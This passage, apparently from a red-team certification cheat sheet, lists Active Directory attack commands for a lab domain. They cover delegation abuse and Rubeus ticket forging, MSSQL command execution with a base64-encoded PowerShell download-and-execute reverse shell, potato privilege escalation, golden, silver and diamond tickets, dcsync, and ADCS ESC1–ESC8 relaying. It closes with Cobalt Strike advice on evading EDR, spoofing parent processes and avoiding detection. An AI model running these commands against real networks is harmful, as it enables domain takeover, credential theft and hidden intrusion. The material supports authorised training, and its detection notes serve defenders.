class="nx">SecurityIdentifier</span><span class="w">
+</span><span class="c">### Resolve Group SID</span><span class="w">
+</span><span class="n">Get-ADGroup</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="s1">'objectsid -eq "S-1-5-21-3926355307-1661546229-813047887-1107"'</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="s1">'lon-dc-1'</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w">
+</span><span class="c">### Configure RBCD on wkstn1 and ws1 to lon-fs-1</span><span class="w">
+</span><span class="nv">$ws1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'lon-ws-1'</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="s1">'lon-dc-1'</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w">
+</span><span class="nv">$wkstn1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'lon-wkstn-1'</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="s1">'lon-dc-1'</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w">
+</span><span class="n">Set-ADComputer</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'lon-fs-1'</span><span class="w"> </span><span class="nt">-PrincipalsAllowedToDelegateToAccount</span><span class="w"> </span><span class="nv">$ws1</span><span class="p">,</span><span class="nv">$wkstn1</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="s1">'lon-dc-1'</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w">
+</span><span class="c">### Via PowerView - Add Sid of the Controlled Computer Object</span><span class="w">
+</span><span class="nv">$SD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Security.AccessControl.RawSecurityDescriptor</span><span class="w"> </span><span class="nt">-ArgumentList</span><span class="w"> </span><span class="s2">"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1330904444-131528338-293942226-1337)"</span><span class="p">;</span><span class="nv">$SDBytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">byte</span><span class="p">[]</span><span class="w"> </span><span class="p">(</span><span class="nv">$SD</span><span class="o">.</span><span class="nf">BinaryLength</span><span class="p">);</span><span class="nv">$SD</span><span class="o">.</span><span class="nf">GetBinaryForm</span><span class="p">(</span><span class="nv">$SDBytes</span><span class="p">,</span><span class="w"> </span><span class="nx">0</span><span class="p">);</span><span class="n">Get-DomainComputer</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'LON-FS-1'</span><span class="o">|</span><span class="w"> </span><span class="n">Set-DomainObject</span><span class="w"> </span><span class="nt">-Set</span><span class="w"> </span><span class="p">@{</span><span class="s1">'msds-allowedtoactonbehalfofotheridentity'</span><span class="o">=</span><span class="nv">$SDBytes</span><span class="p">}</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span><span class="c">### Check For existing RBCD</span><span class="w">
+</span><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nt">-Filter</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">PrincipalsAllowedToDelegateToAccount</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="s1">'lon-dc-1'</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="nx">PrincipalsAllowedToDelegateToAccount</span><span class="w">
+</span><span class="n">Get-ADComputer</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'lon-fs-1'</span><span class="w"> </span><span class="nt">-Properties</span><span class="w"> </span><span class="nx">PrincipalsAllowedToDelegateToAccount</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="s1">'lon-dc-1'</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="nx">Name</span><span class="p">,</span><span class="nx">PrincipalsAllowedToDelegateToAccount</span><span class="w">
+</span><span class="c">### Restore RBCD</span><span class="w">
+</span><span class="n">Set-ADComputer</span><span class="w"> </span><span class="nt">-Identity</span><span class="w"> </span><span class="s1">'lon-fs-1'</span><span class="w"> </span><span class="nt">-PrincipalsAllowedToDelegateToAccount</span><span class="w"> </span><span class="nv">$ws1</span><span class="w"> </span><span class="nt">-Server</span><span class="w"> </span><span class="s1">'lon-dc-1'</span><span class="w"> </span><span class="nt">-Credential</span><span class="w"> </span><span class="nv">$Cred</span><span class="w">
+</span><span class="c">## RBCD Attack</span><span class="w">
+</span><span class="c">### Get the machine account TGT</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">dump</span><span class="w"> </span><span class="nx">/luid:0x3e7</span><span class="w"> </span><span class="nx">/service:krbtgt</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+</span><span class="n">krb_dump</span><span class="w"> </span><span class="nx">/luid:3e4</span><span class="w"> </span><span class="nx">/service:krbtgt</span><span class="w">
+</span><span class="c">### Get a service ticket for lon-fs-1</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">s4u</span><span class="w"> </span><span class="nx">/user:lon-wkstn-1</span><span class="err">$</span><span class="w"> </span><span class="nx">/impersonateuser:Administrator</span><span class="w"> </span><span class="nx">/msdsspn:cifs/lon-fs-1</span><span class="w"> </span><span class="nx">/ticket:doIF</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+</span><span class="n">krb_s4u</span><span class="w"> </span><span class="nx">/user:lon-wkstn-1</span><span class="err">$</span><span class="w"> </span><span class="nx">/impersonateuser:Administrator</span><span class="w"> </span><span class="nx">/service:cifs/lon-fs-1</span><span class="w"> </span><span class="nx">/tgs:Y</span><span class="w"> </span><span class="nx">/ticket:</span><span class="w">
+</span></pre></table></code></div></div><h2 id="microsoft-sql-server"><strong>Microsoft SQL Server</strong></h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+</pre><td class="rouge-code"><pre><span class="c"># Discovery</span>
+ldapsearch <span class="o">(</span>&amp;<span class="o">(</span><span class="nv">samAccountType</span><span class="o">=</span>805306368<span class="o">)(</span><span class="nv">servicePrincipalName</span><span class="o">=</span>MSSQLSvc<span class="k">*</span><span class="o">))</span> <span class="nt">--attributes</span> name,samAccountName,servicePrincipalName
+portscan 10.10.120.0/23 1433 arp 1024
+
+<span class="c"># Enumeration</span>
+sql-1434udp 10.10.120.20
+sql-info lon-db-1
+sql-whoami lon-db-1
+sql-query lon-db-1 <span class="s2">"SELECT @@SERVERNAME"</span>
+sql-databases / sql-tables / sql-columns 
+
+<span class="c"># Code Execution</span>
+<span class="c">## xp_cmdshell</span>
+sql-query lon-db-1 <span class="s2">"SELECT name,value FROM sys.configurations WHERE name = 'xp_cmdshell'"</span>
+sql-enablexp lon-db-1
+sql-xpcmd lon-db-1 <span class="s2">"hostname &amp;&amp; whoami"</span>
+sql-disablexp lon-db-1
+<span class="c">## OLE Automation</span>
+sql-query lon-db-1 <span class="s2">"SELECT name,value FROM sys.configurations WHERE name = 'Ole Automation Procedures'"</span>
+sql-enableole lon-db-1
+sql-olecmd lon-db-1 <span class="s2">"cmd /c calc"</span>
+sql-disableole lon-db-1
+<span class="c">### Reverse shell</span>
+<span class="nv">$cmd</span> <span class="o">=</span> <span class="s1">'iex (new-object net.webclient).downloadstring("http://lon-wkstn-1:8080/b")'</span>
+<span class="o">[</span>Convert]::ToBase64String<span class="o">([</span>Text.Encoding]::Unicode.GetBytes<span class="o">(</span><span class="nv">$cmd</span><span class="o">))</span>
+sql-olecmd lon-db-1 <span class="s2">"cmd /c powershell -w hidden -nop -enc [ONE-LINER]"</span>
+<span class="nb">link </span>lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
+<span class="c">## SQL Common Language Runtime</span>
+sql-query lon-db-1 <span class="s2">"SELECT value FROM sys.configurations WHERE name = 'clr enabled'"</span>
+sql-enableclr lon-db-1
+sql-disableclr lon-db-1
+sql-clr lon-db-1 C:<span class="se">\U</span>sers<span class="se">\A</span>ttacker<span class="se">\s</span>ource<span class="se">\r</span>epos<span class="se">\C</span>lassLibrary1<span class="se">\b</span><span class="k">in</span><span class="se">\R</span>elease<span class="se">\C</span>lassLibrary1.dll MyProcedure
+
+<span class="c"># Linked Servers</span>
+sql-links lon-db-1
+<span class="c">## Excute Commands on linked DB</span>
+sql-query lon-db-1 <span class="s2">"SELECT @@SERVERNAME"</span> <span class="s2">""</span> lon-db-2
+sql-whoami lon-db-1 <span class="s2">""</span> lon-db-2
+<span class="c">## Enable RPC for Command Excution</span>
+sql-checkrpc lon-db-1
+sql-enablerpc lon-db-1 lon-db-2
+sql-clr lon-db-1 C:<span class="se">\U</span>sers<span class="se">\A</span>ttacker<span class="se">\s</span>ource<span class="se">\r</span>epos<span class="se">\C</span>lassLibrary1<span class="se">\b</span><span class="k">in</span><span class="se">\R</span>elease<span class="se">\C</span>lassLibrary1.dll MyProcedure <span class="s2">""</span> lon-db-2
+
+<span class="c"># Local PrivEsc</span>
+<span class="c">## Having a shell as a service account NT Service\MSSQLSERVER</span>
+execute-assembly C:<span class="se">\T</span>ools<span class="se">\S</span>weetPotato<span class="se">\b</span><span class="k">in</span><span class="se">\R</span>elease<span class="se">\S</span>weetPotato.exe <span class="nt">-p</span> <span class="s2">"C:</span><span class="se">\W</span><span class="s2">indows</span><span class="se">\S</span><span class="s2">erviceProfiles</span><span class="se">\M</span><span class="s2">SSQLSERVER</span><span class="se">\A</span><span class="s2">ppData</span><span class="se">\L</span><span class="s2">ocal</span><span class="se">\M</span><span class="s2">icrosoft</span><span class="se">\W</span><span class="s2">indowsApps</span><span class="se">\t</span><span class="s2">cp-local_x64.exe"</span>
+connect localhost 1337
+</pre></table></code></div></div><h2 id="trusts-attacks"><strong>Trusts Attacks</strong></h2><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre><span class="c"># Parent/Child Trusts</span><span class="w">
+</span><span class="n">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">golden</span><span class="w"> </span><span class="nx">/aes256:child_domain_krbkey</span><span class="w"> </span><span class="nx">/user:Administrator</span><span class="w"> </span><span class="nx">/domain:child_domain</span><span class="w"> </span><span class="nx">/sid:child_domainSID</span><span class="w"> </span><span class="nx">/sids:EA_GroupSID</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+</span><span class="c">## Using Diamond Ticket technique</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">diamond</span><span class="w"> </span><span class="nx">/tgtdeleg</span><span class="w"> </span><span class="nx">/ticketuser:Administrator</span><span class="w"> </span><span class="nx">/ticketuserid:500</span><span class="w"> </span><span class="nx">/sids:EA_GroupSID</span><span class="w"> </span><span class="nx">/krbkey:child_domain_krbkey</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+
+</span><span class="c"># One-Way Inbound Trusts</span><span class="w">
+</span><span class="c">## Get a TGT / Referral tickets Using Domain Trust / inter-realm Key </span><span class="w">
+</span><span class="n">dcsync</span><span class="w"> </span><span class="nx">contoso.com</span><span class="w"> </span><span class="nx">CONTOSO\PARTNER</span><span class="err">$</span><span class="w">
+</span><span class="n">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">silver</span><span class="w"> </span><span class="nx">/user:pchilds</span><span class="w"> </span><span class="nx">/domain:CONTOSO.COM</span><span class="w"> </span><span class="nx">/sid:trusted_domainSID</span><span class="w"> </span><span class="nx">/id:1105</span><span class="w"> </span><span class="nx">/groups:513</span><span class="p">,</span><span class="nx">1106</span><span class="p">,</span><span class="nx">foreign_group_RID</span><span class="w"> </span><span class="nx">/service:krbtgt/partner.com</span><span class="w"> </span><span class="nx">/rc4:inter_relam_key</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+</span><span class="c">## Get TGS</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgs</span><span class="w"> </span><span class="nx">/service:cifs/par-jmp-1.partner.com</span><span class="w"> </span><span class="nx">/dc:trusting_domain_dc</span><span class="w"> </span><span class="nx">/ticket:doIFM</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+
+</span><span class="c"># One-Way Outbound Trusts</span><span class="w">
+</span><span class="c">## Get a Copy of the trust account key from the trusting domain TDO</span><span class="w">
+</span><span class="n">mimikatz</span><span class="w"> </span><span class="nx">lsadump::dcsync</span><span class="w"> </span><span class="nx">/domain:partner.com</span><span class="w"> </span><span class="nx">/guid:</span><span class="p">{</span><span class="mi">288</span><span class="n">d9ee6-2b3c-42aa-bef8-959ab4e484ed</span><span class="p">}</span><span class="w">
+</span><span class="c">## Get a TGT from the trusted domain, after that you can enumerate the trusted domain and its users</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:PARTNER</span><span class="err">$</span><span class="w"> </span><span class="nx">/domain:trusted_domain</span><span class="w"> </span><span class="nx">/dc:trusted_domain_dc</span><span class="w">  </span><span class="nx">/rc4:inter_relam_key</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+</span></pre></table></code></div></div><h2 id="adcs-attacks"><strong>ADCS Attacks</strong></h2><div class="language-powershell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+</pre><td class="rouge-code"><pre><span class="c"># Enumeration</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Certify\Certify\bin\Release\Certify.exe</span><span class="w"> </span><span class="nx">enum-templates</span><span class="w"> </span><span class="nt">--filter-enabled</span><span class="w"> </span><span class="nt">--filter-vulnerable</span><span class="w"> </span><span class="nt">--hide-admins</span><span class="w"> </span><span class="nt">--quiet</span><span class="w">
+
+</span><span class="c"># ESC1</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Certify\Certify\bin\Release\Certify.exe</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nt">--ca</span><span class="w"> </span><span class="s2">"lon-cs-1.contoso.com\CONTOSO Root CA"</span><span class="w"> </span><span class="nt">--template</span><span class="w"> </span><span class="nx">ESC1</span><span class="w"> </span><span class="nt">--upn</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">--quiet</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe</span><span class="w"> </span><span class="nx">asktgt</span><span class="w"> </span><span class="nx">/user:Administrator</span><span class="w"> </span><span class="nx">/domain:CONTOSO.COM</span><span class="w"> </span><span class="nx">/certificate:MIACAQM..</span><span class="w"> </span><span class="nx">/enctype:aes256</span><span class="w"> </span><span class="nx">/nowrap</span><span class="w">
+
+</span><span class="c"># ESC3</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Certify\Certify\bin\Release\Certify.exe</span><span class="w"> </span><span class="nx">request</span><span class="w"> </span><span class="nt">--ca</span><span class="w"> </span><span class="s2">"lon-cs-1.contoso.com\CONTOSO Root CA"</span><span class="w"> </span><span class="nt">--template</span><span class="w"> </span><span class="nx">ESC3</span><span class="w"> </span><span class="nt">--quiet</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Certify\Certify\bin\Release\Certify.exe</span><span class="w"> </span><span class="nx">request-agent</span><span class="w"> </span><span class="nt">--ca</span><span class="w"> </span><span class="s2">"lon-cs-1.contoso.com\CONTOSO Root CA"</span><span class="w"> </span><span class="nt">--template</span><span class="w"> </span><span class="nx">User</span><span class="w"> </span><span class="nt">--target</span><span class="w"> </span><span class="nx">Administrator</span><span class="w"> </span><span class="nt">--agent-pfx</span><span class="w"> </span><span class="nx">MIACAQ</span><span class="p">[</span><span class="o">...</span><span class="nf">snip</span><span class="o">...</span><span class="p">]</span><span class="nx">AAAAA</span><span class="o">=</span><span class="w"> </span><span class="nt">--quiet</span><span class="w">
+
+</span><span class="c"># ESC4 -&gt; ESC1</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\Certify\Certify\bin\Release\Certify.exe</span><span class="w"> </span><span class="nx">manage-template</span><span class="w"> </span><span class="nt">--template</span><span class="w"> </span><span class="nx">ESC4</span><span class="w"> </span><span class="nt">--supply-subject</span><span class="w"> </span><span class="nt">--quiet</span><span class="w">
+
+</span><span class="c"># ESC8</span><span class="w">
+</span><span class="c">## Unbind port 445 on a compromised machine</span><span class="w">
+</span><span class="c">### Set the lanmanserver service's start mode to disabled to prevent it from automatically restarting</span><span class="w">
+</span><span class="n">sc_config</span><span class="w"> </span><span class="nx">lanmanserver</span><span class="w"> </span><span class="s2">"C:\Windows\system32\svchost.exe -k netsvcs -p"</span><span class="w"> </span><span class="nx">1</span><span class="w"> </span><span class="nx">4</span><span class="w">
+</span><span class="c">### Stop these services to unbind port 445</span><span class="w">
+</span><span class="n">sc_stop</span><span class="w"> </span><span class="nx">lanmanserver</span><span class="w">
+</span><span class="n">sc_stop</span><span class="w"> </span><span class="nx">srv2</span><span class="w">
+</span><span class="n">sc_stop</span><span class="w"> </span><span class="nx">srvnet</span><span class="w">
+</span><span class="c">## Start a reverse port forward on port 445 to tunnel incoming NTLM authentication requests down to our attacker machine</span><span class="w">
+</span><span class="n">rportfwd_local</span><span class="w"> </span><span class="nx">445</span><span class="w"> </span><span class="nx">localhost</span><span class="w"> </span><span class="nx">7445</span><span class="w">
+</span><span class="c">## Run a SOCKS proxy for ntlmrelayx to forward the relayed requests back up to the ADCS HTTP endpoint</span><span class="w">
+</span><span class="n">socks</span><span class="w"> </span><span class="nx">1080</span><span class="w"> </span><span class="nx">socks5</span><span class="w">
+</span><span class="c">## Add an explicit Rule to allow inbound connection to Port 445 </span><span class="w">
+</span><span class="n">powerpick</span><span class="w"> </span><span class="nx">New-NetFirewallRule</span><span class="w"> </span><span class="nt">-DisplayName</span><span class="w"> </span><span class="s2">"File Sharing"</span><span class="w"> </span><span class="nt">-Direction</span><span class="w"> </span><span class="nx">Inbound</span><span class="w"> </span><span class="nt">-Protocol</span><span class="w"> </span><span class="nx">TCP</span><span class="w"> </span><span class="nt">-Action</span><span class="w"> </span><span class="nx">Allow</span><span class="w"> </span><span class="nt">-LocalPort</span><span class="w"> </span><span class="nx">445</span><span class="w">
+</span><span class="c">## run ntlmrelayx inside the Kali Docker container</span><span class="w">
+</span><span class="n">proxychains</span><span class="w"> </span><span class="nx">impacket-ntlmrelayx</span><span class="w"> </span><span class="nt">-t</span><span class="w"> </span><span class="nx">http://10.10.120.5/certsrv/certfnsh.asp</span><span class="w"> </span><span class="nt">-smb2support</span><span class="w"> </span><span class="nt">--adcs</span><span class="w"> </span><span class="nt">--template</span><span class="w"> </span><span class="nx">DomainController</span><span class="w">
+</span><span class="c">## Use coerced authentication technique to force authentication from the DC machine to the compromised machine</span><span class="w">
+</span><span class="c">## The reverse port forward will tunnel the request down to ntlmrelayx, relay up through the SOCKS proxy. A file called LON-DC-1.pfx will be created.</span><span class="w">
+</span><span class="n">execute-assembly</span><span class="w"> </span><span class="nx">C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe</span><span class="w"> </span><span class="nx">10.10.120.1</span><span class="w"> </span><span class="nx">10.10.121.108</span><span class="w">
+</span></pre></table></code></div></div><p>Simple diagram summarizing the ESC8 NTLM relaying via C2:</p><ol><li>From the foothold machine force the DC machine to make an outbound SMB connection (NTLM auth) to the compromised host on port 445.<li>The DC’s NTLM auth packet hits port 445 on the compromised host. Beacon<code class="language-plaintext highlighter-rouge">rportfwd_local</code> immediately tunnels that packet down the C2 channel to your local machine at <code class="language-plaintext highlighter-rouge">localhost:7445</code>.<li>Docker is listening on <code class="language-plaintext highlighter-rouge">localhost:7445</code>, which maps to port 445 inside the Kali container. ntlmrelayx receives the raw NTLM auth.<li>ntlmrelayx relays the auth request outbound via <code class="language-plaintext highlighter-rouge">proxychains</code> through Beacon’s SOCKS proxy on port 1080. That proxy routes the traffic back up through the C2 into the internal network, destination: ADCS HTTP endpoint on port 80.<li>ADCS sees what looks like the DC authenticating to request a certificate. It issues a <code class="language-plaintext highlighter-rouge">DomainController</code> template certificate.<li>The certificate comes back through the same SOCKS tunnel to ntlmrelayx, which saves it as <code class="language-plaintext highlighter-rouge">LON-DC-1.pfx</code>.<li>Finally you can use that cert to get a TGT for the DC machine account, and from there S4U2self to impersonate a domain admin.</ol><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/crto/cs.png" alt="ESC8 NTLM relaying via C2" /></p><h2 id="opsec-notes"><strong>OPSEC Notes</strong></h2><ul><li><strong>Cobalt Strike</strong><ul><li>Review and customize resource files and artifact kits to remove default signatures and reduce static detection by security controls.<li>Harden the C2 profile by enabling critical OPSEC-related options, such as disabling AMSI for spawned processes, adjusting process injection settings especially CreateRemote thread, and tuning staging and communication behaviors to minimize detection.<li>Avoid default or well-known profile values as Default profiles and flags are frequently fingerprinted by EDR and NDR solutions.<li>Modify default named pipe values in the profile to avoid well-known or commonly flagged pipe names, ensuring inter-process communication blends in with legitimate system activity.</ul><li><strong>Beacon Commands</strong><ul><li><strong>spawnto</strong><ul><li>if your new beacons spawn in <code class="language-plaintext highlighter-rouge">rundll32.exe</code> be sure to replace all references to <code class="language-plaintext highlighter-rouge">rundll32.exe</code> by <code class="language-plaintext highlighter-rouge">dllhost.exe</code> or other uncommon process in the <code class="language-plaintext highlighter-rouge">script_template.cna</code> in the artifact kit, rebuild the artifact kit, reload the cna script in CS and regenerate all you payload.<li>When selecting a <code class="language-plaintext highlighter-rouge">spawnto</code> process:<ul><li>Choose a binary that already exists on the system.<li>Match the correct architecture (x86 vs x64).<li>Ensure the parent-child relationship makes logical sense.<li>Avoid protected or highly monitored binaries.<li>Make sure the process behavior supports what you are about to run (e.g., network activity, short-lived execution, or long-running tasks).</ul><li>Below are commonly used options:<ul><li><code class="language-plaintext highlighter-rouge">explorer.exe</code> – Very common on workstations, especially when paired with a realistic PPID from a user-level <code class="language-plaintext highlighter-rouge">explorer.exe</code> instance. Suitable for user-context activity.<li><code class="language-plaintext highlighter-rouge">svchost.exe</code> – Frequently present on all Windows systems. However, many services run under it, so misuse or unusual child behavior can be suspicious.<li><code class="language-plaintext highlighter-rouge">rundll32.exe</code> – Default in many configurations but heavily monitored and not recommeded at all.<li><code class="language-plaintext highlighter-rouge">spoolsv.exe</code> / <code class="language-plaintext highlighter-rouge">msiexec.exe</code> – Common service-related binaries that may blend well in certain enterprise environments.<li><code class="language-plaintext highlighter-rouge">werfault.exe</code> / <code class="language-plaintext highlighter-rouge">wermgr.exe</code> – Good choices in some environments because they legitimately perform network communication, are spawned by other processes, and may execute multiple times during normal crash handling. However, their behavior is typically short-lived and context-driven, so long-running activity or inconsistent parent processes can still appear anomalous.<li><code class="language-plaintext highlighter-rouge">gpresult.exe</code> / <code class="language-plaintext highlighter-rouge">gpupdate.exe</code> – Better suited for short-lived actions rather than long-running tasks.</ul></ul><li><strong>Fork &amp; Run Commands</strong><ul><li>Before executing any fork-and-run commands, consider modifying the sacrificial process spawned by Cobalt Strike using the <code class="language-plaintext highlighter-rouge">spawnto</code> command, to reduce OPSEC risk.</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/crto/image%201.png" alt="Process Injection" /></p><li><strong>Spawning Process</strong><ul><li>After gaining an initial shell such as <code class="language-plaintext highlighter-rouge">cmd.exe</code> or <code class="language-plaintext highlighter-rouge">powershell.exe</code>, it is recommended to quickly migrate the beacon to a benign, legitimate process to blend in and minimize detection, then terminate the original noisy process.<li>Ensure injected or spawned processes align with expected parent-child relationships and user context use <code class="language-plaintext highlighter-rouge">PPID</code> to change that.</ul><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/crto/image%202.png" alt="Before Spawning Process" /></p><li>Beacon provides many <strong>API-only commands</strong> that aim to replace the need to run these types of commands <code class="language-plaintext highlighter-rouge">shell dir</code> <code class="language-plaintext highlighter-rouge">run dir</code>.  For instance, use <code class="language-plaintext highlighter-rouge">ls</code> over dir and <code class="language-plaintext highlighter-rouge">getuid</code> over whoami.<li><p>Keep an eye for the following before executing beacon commands.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/crto/image%203.png" alt="Instrumentation and Telemetry" /></p><li><strong>Lateral Movement</strong><ul><li>Avoid using PsExec, as it creates a service on the remote host that may persist and leave artifacts. Consider alternatives such as <code class="language-plaintext highlighter-rouge">scshell</code> or other lateral movement techniques that do not rely on service creation.</ul></ul><li><strong>AppLocker</strong><ul><li>Before executing any binaries, assess the target’s AppLocker policy and identify possible bypasses to avoid execution blocks and detection.</ul><li><strong>LSASS</strong><ul><li>Dumping credentials from LSASS is generally a bad idea from an OPSEC perspective, and best avoided where possible.  Security drivers can use the <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obregistercallbacks">ObRegisterCallbacks</a> kernel function to get notified when one process opens a handle to another process.</ul><li><strong>Network Egress Anomalies</strong><ul><li>To avoid network egress anomalies, ensure outbound HTTP communications originate from processes that normally generate web traffic, such as browser-related processes, rather than unusual or rarely networked executables.</ul><li><strong>AV and Firewall</strong><ul><li>Disabling the firewall or Microsoft Defender is noisy and increases detection risk; maintaining existing security controls helps preserve OPSEC.</ul><li><strong>LDAP Enumeration</strong><ul><li>Signatured LDAP queries<li>Search Time Threshold: These are queries that take longer than N milliseconds to run.  The two main factors that contribute to the search time are its size (as above), and the number of attributes you’ve asked it to return.  Using <code class="language-plaintext highlighter-rouge">*,ntsecuritydescriptor</code> in ldapsearch will result in the slowest time for a given query.  If you’re worried about this, dial it back to bare essentials like <code class="language-plaintext highlighter-rouge">samaccounttype,distinguishedname,objectsid,ntsecuritydescriptor</code>.<li>Inefficient Search Results Threshold: These are queries that return less than 10% of the visited objects <em>if</em> that number of visited objects is more than the given threshold. such as the one used to find kerberoastable users. In some cases, you may be better off enumerating the important details of every user in one go, like This will return all of the visited objects (and therefore be considered efficient), and it will be reasonably quick if we keep the number of attributes down. The only risk is if this tripped the expensive search results threshold.</ul><li><strong>AS-REP Roasting</strong><ul><li>Each AS-REP generates a <code class="language-plaintext highlighter-rouge">4768</code> event, so a single user sending multiple AS-REQs in a short timeframe should be investigated. Rubeus also requests RC4-encrypted tickets by default because they are easier to crack. However, since modern versions of Windows uses AES128 and 256, the use of RC4 tickets can stand out.</ul><li><strong>Kerberoasting</strong><ul><li>Each TGS-REP generates a 4769 event, so a single user requesting multiple tickets in a short timeframe should be investigated. As with AS-REP Roasting, Rubeus requests service tickets using RC4 encryption by default.</ul><li><strong>LOLABS</strong><ul><li>Most mature organizations have a good handle on LOLBAS abuses.  They can be blocked outright using application control technologies such as AppLocker and WDAC, or their use simply logged via process creation events generated by Sysmon or other monitoring tools.  For those reasons, the use of LOLBAS is generally more applicable to adversary emulation rather than simulation.</ul><li><strong>DCSync</strong><ul><li>Because DRS is legitimately used, its mere presence does not constitute a breach in the environment.  Defenders must look for anomalous replication requests that stand out from the norm, for example those that originate from IPs other than known domain controllers. When Directory Service Access auditing is enabled, these replications are logged as 4662 events.  The identifying GUID is <code class="language-plaintext 